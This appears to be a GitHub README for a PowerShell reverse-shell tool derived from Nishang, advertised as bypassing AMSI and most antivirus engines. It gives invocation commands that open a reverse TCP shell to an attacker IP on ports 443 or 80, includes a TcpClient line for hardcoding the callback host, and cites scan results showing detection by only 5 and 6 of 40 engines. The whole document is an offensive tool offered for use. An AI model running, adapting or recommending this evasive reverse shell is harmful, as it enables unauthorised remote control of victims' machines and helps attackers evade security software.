# RevershellTCP_BypassAMSI

This script is based on Nishang's, thanks for sharing<br>

## Rrshell.ps1

```sh
. .\ .\rshell.ps1 192.168.100.6 443
```
![image](https://user-images.githubusercontent.com/66162160/163723667-0e4ff036-e469-4d8e-b6ac-919344bb7e0b.png)


## If you want to modify the connection automatically with no arguments just modify line 1 as follows.

$servidor = new-object System.Net.Sockets.TcpClient('192.168.100.6',80);  <br>

## Bypass 05/40 AV 

https://kleenscan.com/scan_result/4789bcc1351d6c4ded38b058fc8696bac69204dc4866f404310b14d0d2fcbd04

![image](https://user-images.githubusercontent.com/66162160/163724011-54d3413f-6b90-43fd-9632-6e77764b1cb2.png)

## Invoke-rshell.ps1

![image](https://user-images.githubusercontent.com/66162160/163725207-c6303bc6-2a82-4928-9ab0-9b373a4b7ff7.png)

```sh
. .\Invoke-rshell.ps1
 Invoke-rshell -Reverse -IP 192.168.100.6 -Port 443
 ```
 
 ## Bypass 06/40 AV 
 
 https://kleenscan.com/scan_result/a97aea202537ca78fbf4cb610eec57d1e6cc5a310e3be0ff63690cd482d5519d
 
 ![image](https://user-images.githubusercontent.com/66162160/163725249-92cae09a-974a-4637-9b82-f721cbab4915.png)
